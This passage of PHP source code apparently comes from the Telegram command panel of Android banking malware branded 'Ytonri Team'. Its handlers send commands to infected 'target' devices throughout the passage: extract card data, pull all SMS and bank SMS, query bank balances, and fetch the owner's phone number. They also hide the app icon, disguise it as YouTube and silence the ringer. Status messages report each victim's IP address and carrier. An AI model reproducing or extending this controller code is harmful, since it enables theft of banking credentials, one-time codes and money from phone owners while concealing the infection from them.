                    'time' => time(),
                    'action' => 'extract_cards'
                ]));  
                  
                requests('all_sms', $device_id);
            }
        }
        
    } elseif (strpos($data, "nametarget") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $back_control = json_encode([
                'resize_keyboard' => true, 
                'inline_keyboard' => [
                    [
                        ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $datass[1]"]
                    ]
                ]
            ]);
            
            emg($chat_id, $mi, "<blockquote>👁️ ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ</b> ››</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $back_control);
            file_put_contents("user/$chat_id/command.txt", "settragetname $device_id");
        }
        
    } elseif (strpos($command, "settragetname") !== false) {
        $datass = explode(" ", $command);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $info_button = info_button($device_id);

            smg($chat_id, "<blockquote>👁️ <b>ᴛᴀʀɢᴇᴛ ɴᴀᴍᴇ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $info_button);
            file_put_contents("user/$device_id-name.txt", $text);
            file_put_contents("user/$chat_id/command.txt", "");
        }
        
    } elseif ($data == "firstaction") {
        if (!file_exists("data/firstaction.json")) {
            file_put_contents("data/firstaction.json", '{"balance":"off","targetphone":"off","autohide":"off"}');
        }
        
        $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
        $bal = $firstActionData['balance'] ?? 'off';
        $tarphone = $firstActionData['targetphone'] ?? 'off';
        $hideact = $firstActionData['autohide'] ?? 'off';
        
        $firstActionButton = json_encode(array('inline_keyboard' => [
            [['text' => "☠️ ʙᴀʟᴀɴᴄᴇ ☠️", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "🕸 ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ 🕸", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "🦇 ᴀᴜᴛᴏ ʜɪᴅᴇ 🦇", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        
        emg($chat_id, $mi, "<blockquote>ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ</blockquote>\n\n<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $firstActionButton);
        
    } elseif ($data == "balanceaction") {
        $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
        if (!is_array($firstActionData)) {
            $firstActionData = ['balance' => 'off', 'targetphone' => 'off', 'autohide' => 'off'];
        }
        
        if ($firstActionData['balance'] == "off") {
            $firstActionData['balance'] = "on";
        } else {
            $firstActionData['balance'] = "off";
        }
        
        file_put_contents("data/firstaction.json", json_encode($firstActionData, JSON_PRETTY_PRINT));
        
        $bal = $firstActionData['balance'];
        $tarphone = $firstActionData['targetphone'];
        $hideact = $firstActionData['autohide'];
        
        $firstActionButton = json_encode(array('inline_keyboard' => [
            [['text' => "☠️ ʙᴀʟᴀɴᴄᴇ ☠️", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "🕸 ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ 🕸", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "🦇 ᴀᴜᴛᴏ ʜɪᴅᴇ 🦇", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        
        emg($chat_id, $mi, "<blockquote>ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ</blockquote>\n\n<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $firstActionButton);
        
    } elseif ($data == "userphoneaction") {
        $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
        if (!is_array($firstActionData)) {
            $firstActionData = ['balance' => 'off', 'targetphone' => 'off', 'autohide' => 'off'];
        }
        
        if ($firstActionData['targetphone'] == "off") {
            $firstActionData['targetphone'] = "on";
        } else {
            $firstActionData['targetphone'] = "off";
        }
        
        file_put_contents("data/firstaction.json", json_encode($firstActionData, JSON_PRETTY_PRINT));
        
        $bal = $firstActionData['balance'];
        $tarphone = $firstActionData['targetphone'];
        $hideact = $firstActionData['autohide'];
        
        $firstActionButton = json_encode(array('inline_keyboard' => [
            [['text' => "☠️ ʙᴀʟᴀɴᴄᴇ ☠️", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "🕸 ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ 🕸", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "🦇 ᴀᴜᴛᴏ ʜɪᴅᴇ 🦇", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        
        emg($chat_id, $mi, "<blockquote>ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ</blockquote>\n\n<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $firstActionButton);
        
    } elseif ($data == "autohideaction") {
        $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
        if (!is_array($firstActionData)) {
            $firstActionData = ['balance' => 'off', 'targetphone' => 'off', 'autohide' => 'off'];
        }
        
        if ($firstActionData['autohide'] == "off") {
            $firstActionData['autohide'] = "on";
        } else {
            $firstActionData['autohide'] = "off";
        }
        
        file_put_contents("data/firstaction.json", json_encode($firstActionData, JSON_PRETTY_PRINT));
        
        $bal = $firstActionData['balance'];
        $tarphone = $firstActionData['targetphone'];
        $hideact = $firstActionData['autohide'];
        
        $firstActionButton = json_encode(array('inline_keyboard' => [
            [['text' => "☠️ ʙᴀʟᴀɴᴄᴇ ☠️", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "🕸 ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ 🕸", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "🦇 ᴀᴜᴛᴏ ʜɪᴅᴇ 🦇", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        
        emg($chat_id, $mi, "<blockquote>ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ</blockquote>\n\n<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $firstActionButton);
        
    } elseif (strpos($data, "balance") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..ꜱ\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ʙᴀɴᴋ ᴀᴄᴄᴏᴜɴᴛꜱ ʙᴀʟᴀɴᴄᴇꜱ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
                requests('balance', $device_id);
            }
        }
        
    } elseif (strpos($data, "last_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʙᴀɴᴋ ꜱᴍꜱ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
                requests('last_bank_sms', $device_id);
            }
        }
        
    } elseif (strpos($data, "All_Bank_sms") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>┌🕸 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                         . "├⚡ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "└🩸 ᴄᴏᴍᴍᴀɴᴅ: ʙᴀɴᴋ ꜱᴍꜱ ʟɪꜱᴛ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            requests('all_bank_sms', $device_id);
        }
        
    } elseif (strpos($data, "vibrate_mode") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>┌🕸 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                         . "├⚡️ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "└🩸 ᴄᴏᴍᴍᴀɴᴅ: ᴠɪʙʀᴀᴛᴇ ᴍᴏᴅᴇ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('Vibrate', $device_id);
            file_put_contents("user/$datass[1]-ringer.txt", "Vibrate");
        }
        
    } elseif (strpos($data, "silent_mode") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            requests('silent', $device_id);
            file_put_contents("user/$datass[1]-ringer.txt", "Silent");
            
            $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
                [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $datass[1]"]]
            ]]);
            smg($chat_id, "<blockquote><b>ᴅᴇᴠɪᴄᴇ ʀɪɴɢᴇʀ ᴍᴏᴅᴇ</b> ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴛᴏ [ <b>ꜱɪʟᴇɴᴛ</b> ]</blockquote>", $back_control);
        }
        
    } elseif (strpos($data, "normal_mode") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>┌🕸 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                         . "├⚡ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "└🩸 ᴄᴏᴍᴍᴀɴᴅ: ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('Normal', $device_id);
            file_put_contents("user/$datass[1]-ringer.txt", "Normal");
        }
        
    } elseif (strpos($data, "hide_icon") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ʜɪᴅᴅᴇɴ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                requests('hidden', $device_id);
                file_put_contents("user/$device_id-apk.txt", "Hidden");
                
                $install_ip = file_get_contents("user/$device_id-ip.txt") ?: "N/A";
                $operator = file_get_contents("user/$device_id-operator.txt") ?: "ᴜɴᴋɴᴏᴡɴ";
                $offline = file_get_contents("user/$device_id-offline.txt") ?: "OFF";
                
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $wait_msg->result->message_id,
                    'text' => "<blockquote>⚡ ɪᴄᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʜɪᴅᴅᴇɴ!</blockquote>\n\n"
                             . "<blockquote>┌🩸ᴍᴏᴅᴇʟ: $device_model\n"
                             . "├☠️ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: ʜɪᴅᴅᴇɴ - ꜱᴄʀᴇᴇɴ: " . ($offline == "ON" ? "OFF" : "ON") . "\n"
                             . "├👁️ᴏᴘᴇʀᴀᴛᴏʀ: $operator\n"
                             . "├🕸ɪᴘ: $ip | $install_ip\n"
                             . "└🦠ᴘᴀɴᴇʟ: /login_$device_id</blockquote>\n\n"
                             . "<blockquote>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</blockquote>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => json_encode([
                        'resize_keyboard' => true, 
                        'inline_keyboard' => []
                    ])
                ]);
                
                file_put_contents("user/$datass[1]-apk.txt", "Hidden");
            }
        }
        
    } elseif (strpos($data, "visible_icon") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ᴜɴʜɪᴅᴇ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$chat_id/wait_msg.txt", json_encode([
                    'message_id' => $wait_msg->result->message_id,
                    'device_id' => $device_id,
                    'command' => 'visible_icon'
                ]));
                
                requests('visible', $device_id);
                file_put_contents("user/$datass[1]-apk.txt", "Visible");
            }
        }
        
    } elseif (strpos($data, "change") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ᴄʜᴀɴɢᴇ ᴀᴘᴘ ɪᴄᴏɴ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
                requests('changetoyoutube', $device_id);
            }
        }
        
    } elseif (strpos($data, "userphone") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $device_model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>🕸┌ ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                         . "⚡├ ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                         . "🩸└ ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ɴᴜᴍʙᴇʀ ᴜꜱᴇʀ</blockquote>\n\n"
                         . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            requests('userphone', $device_id);
        }
    }
}